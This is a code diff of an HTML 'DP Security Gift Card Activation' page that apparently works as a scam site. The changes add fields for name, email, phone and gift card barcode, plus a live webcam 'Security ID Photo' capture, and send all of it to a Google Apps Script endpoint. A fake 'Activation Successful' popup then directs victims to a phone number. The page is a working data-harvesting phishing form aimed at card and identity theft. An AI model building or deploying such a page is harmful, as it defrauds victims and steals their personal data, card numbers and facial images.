@@ -5,158 +5,58 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DP Security Gift Card Activation</title>
     <style>
-        /* General Styles */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-            /* P0: Professional Background */
+            margin: 0; padding: 0;
             background: radial-gradient(circle at center, #1a1c2c 0%, #0d0e14 100%);
             color: #e0e0e0;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
+            display: flex; flex-direction: column; min-height: 100vh;
         }
-
-        a {
-            text-decoration: none;
-            color: inherit;
+        #successModal {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background-color: #1e1e1e; padding: 30px; border-radius: 12px;
+            box-shadow: 0 0 50px rgba(0, 217, 224, 0.4); z-index: 1000;
+            text-align: center; width: 80%; max-width: 400px; border: 2px solid #00d9e0;
         }
-
-        /* Layout & Header */
-        header {
-            text-align: center;
-            padding: 40px 20px;
+        #modalOverlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); z-index: 999;
         }
-
-        .logo-container img {
-            max-width: 300px;
-            height: auto;
-        }
-
-        /* Main Content & Form */
-        main {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
+        .logo-container img { max-width: 300px; height: auto; display: block; margin: 40px auto; }
+        main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
         .activation-container {
-            background-color: rgba(30, 30, 30, 0.95);
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
-            width: 100%;
-            max-width: 500px;
-            border: 1px solid #333;
+            background-color: rgba(30, 30, 30, 0.95); padding: 40px; border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7); width: 100%; max-width: 500px; border: 1px solid #333;
         }
-
-        h2 {
-            text-align: center;
-            color: #00d9e0;
-            margin-top: 0;
-            margin-bottom: 30px;
+        h2 { text-align: center; color: #00d9e0; margin-bottom: 30px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #a0a0a0; }
+        input {
+            width: 100%; padding: 12px; border: 1px solid #333; border-radius: 6px;
+            background-color: #2a2a2a; color: white; font-size: 16px; box-sizing: border-box;
         }
-
-        .form-group {
-            margin-bottom: 20px;
+        #camera-section { margin-top: 15px; text-align: center; }
+        #video-preview { width: 100%; border-radius: 6px; border: 1px solid #00d9e0; display: none; margin-bottom: 10px; }
+        #captured-photo { width: 100%; border-radius: 6px; display: none; margin-bottom: 10px; border: 1px solid #4caf50; }
+        .cam-btn {
+            background: #333; color: #00d9e0; border: 1px solid #00d9e0; padding: 8px 15px;
+            border-radius: 4px; cursor: pointer; margin-bottom: 10px;
         }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-            color: #a0a0a0;
-        }
-
-        input[type="text"],
-        input[type="email"],
-        input[type="tel"],
-        input[type="number"],
-        input[type="file"] {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #333;
-            border-radius: 6px;
-            background-color: #2a2a2a;
-            color: white;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #00d9e0;
-        }
-
-        /* P1: Captcha Styles */
-        .captcha-container {
-            background-color: #1a1a1a;
-            padding: 15px;
-            border-radius: 6px;
-            border: 1px dashed #00d9e0;
-            margin-bottom: 20px;
-        }
-
-        .captcha-label {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            font-weight: bold;
-            color: #00d9e0;
-        }
-
         .submit-btn {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #007bff, #00d9e0);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: transform 0.2s, opacity 0.3s;
+            width: 100%; padding: 15px; background: linear-gradient(135deg, #007bff, #00d9e0);
+            color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer;
         }
-
-        .submit-btn:hover {
-            opacity: 0.9;
-            transform: translateY(-1px);
-        }
-
-        .warning-box {
-            background-color: #3e2723;
-            border: 1px solid #d32f2f;
-            color: #ffcdd2;
-            padding: 15px;
-            border-radius: 6px;
-            margin-top: 25px;
-            font-size: 14px;
-            text-align: center;
-        }
-
-        footer {
-            text-align: center;
-            padding: 20px;
-            background-color: #0a0a0a;
-            font-size: 14px;
-            color: #777;
-            margin-top: auto;
-        }
-
-        .hidden-admin-link {
-            cursor: pointer;
-        }
-
-        .hidden-admin-link:hover {
-            color: #00d9e0;
-        }
+        footer { text-align: center; padding: 20px; background-color: #0a0a0a; font-size: 14px; color: #777; }
     </style>
 </head>
 <body>
+
+<div id="modalOverlay"></div>
+<div id="successModal">
+    <h3 style="color: #00d9e0;">Activation Successful</h3>
+    <p>If you still have any additional issues please call support at 323-374-3366</p>
+    <p style="font-size: 0.8em; color: #777; margin-top: 20px;">(Verification Complete - Security Locked)</p>
+</div>
 
 <header>
     <div class="logo-container">
@@ -167,82 +67,113 @@
 <main>
     <div class="activation-container">
         <h2>Gift Card Activation</h2>
-        
         <form id="activationForm">
             <div class="form-group">
                 <label for="fullName">Full Name</label>
-                <input type="text" id="fullName" name="fullName" required placeholder="John Doe">
+                <input type="text" id="fullName" name="fullName" required placeholder="First and Last Name" pattern="^[a-zA-Z]+\s+[a-zA-Z]+.*$">
             </div>
-
             <div class="form-group">
-                <label for="email">Email Address</label>
+                <label for="email">Email Address (Will be used for login)</label>
                 <input type="email" id="email" name="email" required placeholder="john.doe@example.com">
             </div>
-
             <div class="form-group">
                 <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" name="phone" required placeholder="(555) 123-4567">
+                <input type="tel" id="phone" name="phone" required placeholder="(xxx) xxx-xxxx" maxlength="14">
             </div>
-
             <div class="form-group">
-                <label for="receipt">Upload Receipt (Image)</label>
-                <input type="file" id="receipt" name="receipt" accept="image/*" required>
+                <label>Security ID Photo (Real-time Camera Required)</label>
+                <div id="camera-section">
+                    <video id="video-preview" autoplay playsinline></video>
+                    <img id="captured-photo" alt="Captured ID">
+                    <button type="button" id="start-camera" class="cam-btn">Open Camera</button>
+                    <button type="button" id="take-photo" class="cam-btn" style="display:none;">Capture Photo</button>
+                </div>
             </div>
-
             <div class="form-group">
                 <label for="barcode">Bar Code Number</label>
-                <input type="text" id="barcode" name="barcode" required placeholder="123456789012">
+                <input type="text" id="barcode" name="barcode" required placeholder="Minimum 8 characters">
             </div>
-
-            <div class="captcha-container">
-                <div class="captcha-label">
-                    <span>Security Verification</span>
-                    <span id="captcha-question"></span>
-                </div>
+            <div class="form-group">
+                <label id="captcha-question" style="color:#00d9e0;"></label>
                 <input type="number" id="captcha-answer" placeholder="Enter result" required>
             </div>
-
             <button type="submit" class="submit-btn">Activate Card</button>
         </form>
-
-        <div class="warning-box">
-            <strong>WARNING:</strong> This gift card can only be used from a registered IP address and Country. Unauthorized usage attempts will result in card suspension.
-        </div>
     </div>
 </main>
 
 <footer>
-    <a href="mock.html" class="hidden-admin-link">Copyright &copy; DP Security <span id="year"></span></a>
+    <a href="mock.html" style="cursor: pointer;">Copyright &copy; DP Security <span id="year"></span></a>
 </footer>
 
 <script>
     document.getElementById('year').textContent = new Date().getFullYear();
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyhz28c3voiDfTIyNk63V5QH5AUMaqZYWKjT96Q0ZJdjeTwAkWIcGUbraEjN8_kVIqt/exec';
 
-    // P1: CAPTCHA Logic
-    let num1 = Math.floor(Math.random() * 10) + 1;
-    let num2 = Math.floor(Math.random() * 10) + 1;
-    let correctAnswer = num1 + num2;
-    document.getElementById('captcha-question').textContent = `What is ${num1} + ${num2}?`;
-
-    document.getElementById('activationForm').addEventListener('submit', function(event) {
-        event.preventDefault();
-
-        const userAnswer = parseInt(document.getElementById('captcha-answer').value);
-        if (userAnswer !== correctAnswer) {
-            alert("Incorrect security verification. Please try again.");
-            return;
-        }
-
-        // P2: Success Popup with support number
-        alert("Activation was successful. If you still have any additional issues please call support at 323-374-3366");
-        
-        this.reset();
-        num1 = Math.floor(Math.random() * 10) + 1;
-        num2 = Math.floor(Math.random() * 10) + 1;
-        correctAnswer = num1 + num2;
-        document.getElementById('captcha-question').textContent = `What is ${num1} + ${num2}?`;
+    document.getElementById('phone').addEventListener('input', function (e) {
+        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
+        e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
     });
-</script>
 
+    const video = document.getElementById('video-preview');
+    const photo = document.getElementById('captured-photo');
+    const startBtn = document.getElementById('start-camera');
+    const takeBtn = document.getElementById('take-photo');
+    let capturedImageData = null;
+
+    startBtn.onclick = async () => {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.style.display = 'block';
+        startBtn.style.display = 'none';
+        takeBtn.style.display = 'inline-block';
+    };
+
+    takeBtn.onclick = () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        capturedImageData = canvas.toDataURL('image/png');
+        photo.src = capturedImageData;
+        photo.style.display = 'block';
+        video.style.display = 'none';
+        takeBtn.style.display = 'none';
+        video.srcObject.getTracks().forEach(track => track.stop());
+    };
+
+    let n1 = Math.floor(Math.random() * 12) + 2, n2 = Math.floor(Math.random() * 5) + 2, n3 = Math.floor(Math.random() * 10) + 1;
+    let correctAnswer = (n1 * n2) + n3;
+    document.getElementById('captcha-question').textContent = `Security Math: (${n1} × ${n2}) + ${n3}`;
+
+    document.getElementById('activationForm').onsubmit = async (e) => {
+        e.preventDefault();
+        if (!capturedImageData) { alert("Please take a security photo first."); return; }
+        if (document.getElementById('barcode').value.length < 8) { alert("Bar code is incorrect"); return; }
+        if (parseInt(document.getElementById('captcha-answer').value) !== correctAnswer) { alert("Security check failed."); return; }
+
+        const submission = {
+            date: new Date().toLocaleString(),
+            name: document.getElementById('fullName').value,
+            email: document.getElementById('email').value,
+            phone: document.getElementById('phone').value,
+            barcode: document.getElementById('barcode').value,
+            photo: capturedImageData,
+            status: 'PENDING'
+        };
+
+        try {
+            await fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(submission)
+            });
+            document.getElementById('modalOverlay').style.display = 'block';
+            document.getElementById('successModal').style.display = 'block';
+        } catch (error) {
+            alert("System error. Please try again.");
+        }
+    };
+</script>
 </body>
 </html>
